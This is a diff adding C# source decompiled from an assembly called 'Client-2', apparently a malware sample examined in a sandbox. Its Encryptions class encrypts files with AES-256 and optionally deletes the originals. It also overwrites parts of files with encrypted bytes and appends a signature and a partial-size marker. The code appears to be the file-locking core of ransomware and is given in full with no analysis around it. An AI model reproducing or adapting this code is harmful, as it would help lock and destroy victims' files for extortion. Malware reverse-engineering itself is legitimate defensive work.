@@ -1,0 +1,199 @@
+﻿// Decompiled with JetBrains decompiler
+// Type: Complex.Encryptions
+// Assembly: Client-2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
+// MVID: 10231E92-BCE6-4007-A463-67D77912E754
+// Assembly location: C:\Users\WDAGUtilityAccount\Desktop\5d40615701c48a122e44f831e7c8643d07765629a83b15d090587f469c77693d
+
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Security.Cryptography;
+using System.Text;
+
+namespace Complex
+{
+  public static class Encryptions
+  {
+    public const int AES256KeySize = 256;
+
+    public static byte[] RandomByteArray(int length)
+    {
+      byte[] data = new byte[length];
+      using (RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider())
+      {
+        cryptoServiceProvider.GetBytes(data);
+        return data;
+      }
+    }
+
+    public static bool AESEncryptFile(string filePath, byte[] password, bool delete)
+    {
+      byte[] numArray = Encryptions.RandomByteArray(16);
+      using (FileStream fileStream1 = new FileStream(filePath + ".enc", FileMode.Create))
+      {
+        Rfc2898DeriveBytes key = Encryptions.GenerateKey(password, numArray);
+        password = (byte[]) null;
+        GC.Collect();
+        using (Aes aes = (Aes) new AesManaged())
+        {
+          aes.KeySize = 256;
+          aes.Key = key.GetBytes(aes.KeySize / 8);
+          aes.IV = key.GetBytes(aes.BlockSize / 8);
+          aes.Padding = PaddingMode.ISO10126;
+          aes.Mode = CipherMode.CBC;
+          fileStream1.Write(numArray, 0, numArray.Length);
+          using (CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, aes.CreateEncryptor(), CryptoStreamMode.Write))
+          {
+            using (FileStream fileStream2 = new FileStream(filePath, FileMode.Open))
+            {
+              byte[] buffer = new byte[1];
+              key.Dispose();
+              try
+              {
+                int count;
+                while ((count = fileStream2.Read(buffer, 0, buffer.Length)) > 0)
+                  cryptoStream.Write(buffer, 0, count);
+                if (delete)
+                  File.Delete(filePath);
+                cryptoStream.Close();
+                fileStream1.Close();
+                fileStream2.Close();
+                return true;
+              }
+              catch (Exception ex)
+              {
+                return false;
+              }
+            }
+          }
+        }
+      }
+    }
+
+    public static bool AESDecryptFile(string filePath, byte[] password, bool keep)
+    {
+      byte[] numArray = new byte[16];
+      using (FileStream fileStream1 = new FileStream(filePath, FileMode.Open))
+      {
+        fileStream1.Read(numArray, 0, numArray.Length);
+        Rfc2898DeriveBytes key = Encryptions.GenerateKey(password, numArray);
+        password = (byte[]) null;
+        GC.Collect();
+        using (Aes aes = (Aes) new AesManaged())
+        {
+          aes.KeySize = 256;
+          aes.Key = key.GetBytes(aes.KeySize / 8);
+          aes.IV = key.GetBytes(aes.BlockSize / 8);
+          aes.Padding = PaddingMode.ISO10126;
+          aes.Mode = CipherMode.CBC;
+          using (CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, aes.CreateDecryptor(), CryptoStreamMode.Read))
+          {
+            using (FileStream fileStream2 = new FileStream(filePath.Remove(filePath.Length - 4), FileMode.Create))
+            {
+              byte[] buffer = new byte[1];
+              key.Dispose();
+              try
+              {
+                while (cryptoStream.Read(buffer, 0, buffer.Length) > 0)
+                  fileStream2.Write(buffer, 0, buffer.Length);
+                cryptoStream.FlushFinalBlock();
+                fileStream2.Close();
+                fileStream1.Close();
+                cryptoStream.Close();
+                return true;
+              }
+              catch (Exception ex)
+              {
+                return false;
+              }
+            }
+          }
+        }
+      }
+    }
+
+    public static byte[] AESEncryptBytes(byte[] clear, byte[] password, byte[] salt)
+    {
+      byte[] numArray = (byte[]) null;
+      Rfc2898DeriveBytes key = Encryptions.GenerateKey(password, salt);
+      password = (byte[]) null;
+      GC.Collect();
+      using (Aes aes = (Aes) new AesManaged())
+      {
+        aes.KeySize = 256;
+        aes.Key = key.GetBytes(aes.KeySize / 8);
+        aes.IV = key.GetBytes(aes.BlockSize / 8);
+        aes.Padding = PaddingMode.None;
+        aes.Mode = CipherMode.CBC;
+        using (MemoryStream memoryStream = new MemoryStream())
+        {
+          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
+          {
+            cryptoStream.Write(clear, 0, clear.Length);
+            cryptoStream.Close();
+          }
+          numArray = memoryStream.ToArray();
+        }
+        key.Dispose();
+      }
+      return numArray;
+    }
+
+    public static byte[] AESDecryptBytes(byte[] encrypted, byte[] password, byte[] salt)
+    {
+      byte[] numArray = (byte[]) null;
+      Rfc2898DeriveBytes key = Encryptions.GenerateKey(password, salt);
+      password = (byte[]) null;
+      GC.Collect();
+      using (Aes aes = (Aes) new AesManaged())
+      {
+        aes.KeySize = 256;
+        aes.Key = key.GetBytes(aes.KeySize / 8);
+        aes.IV = key.GetBytes(aes.BlockSize / 8);
+        aes.Padding = PaddingMode.None;
+        aes.Mode = CipherMode.CBC;
+        using (MemoryStream memoryStream = new MemoryStream())
+        {
+          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
+          {
+            cryptoStream.Write(encrypted, 0, encrypted.Length);
+            cryptoStream.Close();
+          }
+          numArray = memoryStream.ToArray();
+        }
+        key.Dispose();
+      }
+      return numArray;
+    }
+
+    public static bool CheckPassword(byte[] password, byte[] salt, byte[] key)
+    {
+      using (Rfc2898DeriveBytes key1 = Encryptions.GenerateKey(password, salt))
+        return ((IEnumerable<byte>) key1.GetBytes(32)).SequenceEqual<byte>((IEnumerable<byte>) key);
+    }
+
+    public static Rfc2898DeriveBytes GenerateKey(byte[] password, byte[] salt) => new Rfc2898DeriveBytes(password, salt, 52768);
+
+    public static byte[] ReadFromFile(string filename, int count)
+    {
+      FileStream fileStream = new FileStream(filename, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
+      byte[] buffer = new byte[count];
+      fileStream.Read(buffer, 0, count);
+      fileStream.Close();
+      fileStream.Dispose();
+      return buffer;
+    }
+
+    public static void WriteToFile(string filename, byte[] encrypted)
+    {
+      FileStream fileStream1 = new FileStream(filename, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
+      fileStream1.Write(encrypted, 0, encrypted.Length);
+      fileStream1.Close();
+      fileStream1.Dispose();
+      byte[] bytes = Encoding.ASCII.GetBytes(Program.Base64Decode(Program.MySign) + Program.Base64Decode("LQ==") + Convert.ToString(Program.PartialSize) + Program.Base64Decode("LQ=="));
+      using (FileStream fileStream2 = new FileStream(filename, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
+        fileStream2.Write(bytes, 0, bytes.Length);
+    }
+  }
+}
